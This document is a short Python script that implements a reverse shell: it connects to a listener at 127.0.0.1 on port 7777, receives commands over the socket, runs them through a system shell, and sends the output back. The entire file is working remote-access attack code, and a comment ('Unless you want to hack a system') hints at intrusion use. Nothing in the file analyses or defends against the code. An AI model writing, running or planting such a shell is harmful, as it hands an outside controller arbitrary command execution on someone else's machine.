import os
import socket
import subprocess

resh_host = '127.0.0.1'
resh_port = 7777
resh_buffer = 1024
# Unless you want to hack a system
resh_visible = True


resh_socket = socket.socket()
resh_socket.connect((resh_host, resh_port))


while True:
    data = resh_socket.recv(resh_buffer)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=resh_visible, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        resh_socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

# Close connection
resh_socket.close()
